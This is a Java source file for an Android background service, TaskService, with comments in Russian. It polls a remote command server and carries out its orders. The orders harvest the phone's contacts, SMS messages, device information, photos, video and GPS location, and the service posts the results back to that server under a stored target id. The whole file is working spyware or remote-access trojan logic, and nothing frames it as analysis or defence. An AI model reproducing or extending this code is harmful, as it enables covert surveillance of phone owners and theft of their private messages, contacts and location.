package com.acme.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import com.acme.activity.MediaActivity;
import com.acme.entity.Contact;
import com.acme.task.SmsTask;
import com.acme.task.listener.TaskListener;
import com.acme.util.Constants;
import com.acme.task.ContactTask;
import com.acme.task.HttpTask;
import com.acme.util.Utils;
import org.json.JSONException;
import org.json.JSONObject;
import roboguice.util.Strings;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

/*
 * Send post and get to server, return next command for execute
*/
public class TaskService extends Service {

    private HttpTask delayedTask;
    private String id;
    private String data;
    private String type;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        init();
        return super.onStartCommand(intent,flags,startId);
    }

    private void init(){
        data = "";
        type = "";

        if(Strings.isEmpty(id)){
            id = Utils.restoreId();
        }
        makePost();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    //create post request
    private void makePost(){
        if(Utils.isConnected()){
            System.out.println("data -> " + data);
            new HttpTask(data, type, id, new HttpTaskListener()).execute(Constants.COMMAND_URL);
        }
    }

    //read post response
    private void readPost(String input) throws InterruptedException {
        System.out.println(input);
        data = "";
        if(input.length()>0){
            try {
                JSONObject object = new JSONObject(input);
                String cmd = object.getString("commandCode");
                if(Strings.isEmpty(id)){
                    id = object.getString("targetId");
                    Utils.storeId(id);
                }

                if(cmd.contentEquals(Constants.CONTACTS_COMMAND)){
                    //команда получения контактов
                    new ContactTask(id,this, new ContactTaskListener()).execute();
                } else if(cmd.contentEquals(Constants.DEVICE_COMMAND)) {
                    //команда получения информации
                    data = InfoService.getInfo().toString();
                    makePost();
                } else if(cmd.contentEquals(Constants.IMAGE_COMMAND)) {
                    //команда получения изображения
                    startActivity(getIntent(Constants.INTENT_PHOTO));
                } else if(cmd.contentEquals(Constants.VIDEO_COMMAND)) {
                    //команда получения видео
                    startActivity(getIntent(Constants.INTENT_VIDEO));
                } else if(cmd.contentEquals(Constants.SMS_COMMAND)) {
                    //команда получения sms
                    new SmsTask(new SmsTaskListener()).execute();
                } else if(cmd.contentEquals(Constants.GPS_COMMAND)) {
                    //команда получения gps координат
                    Utils.startLocationService();
                }else if(cmd.contentEquals(Constants.WAIT_COMMAND)) {
                    Integer delay = (object.getInt("delay"));
                    if(delay!=null && delay!=0){
                        Constants.TASK_INTERVAL = delay;
                    }
                    runDelayTask();
                } else {
                    runDelayTask();
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }
        } else {
            runDelayTask();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopSelf();
    }

    /* Task Listener class */
    public class HttpTaskListener implements TaskListener<String> {

        @Override
        public void taskComplete(String result) {
            System.out.println("HttpTask complete");
            try {
                readPost(result);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    public class ContactTaskListener implements TaskListener<List<Contact>>{

        @Override
        public void taskComplete(List<Contact> result) {
            data = result.toString();
            type = Constants.TEXT;
            makePost();
        }
    }

    public class SmsTaskListener implements TaskListener<String> {
        @Override
        public void taskComplete(String result) {
            data = result.toString();
            type = Constants.TEXT;
            makePost();
        }
    }

    public void runDelayTask(){
        delayedTask = new HttpTask(null,null,id, new HttpTaskListener());
        Timer timer = new Timer();
        timer.schedule(new DelayedTask(),Constants.TASK_INTERVAL);
    }

    private Intent getIntent(String type){
        Intent intent = new Intent(this, MediaActivity.class);
        intent.putExtra("mediaType", type);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        return intent;
    }

    class DelayedTask extends TimerTask {
        public void run() {
            delayedTask.execute(Constants.COMMAND_URL);
        }
    }
}
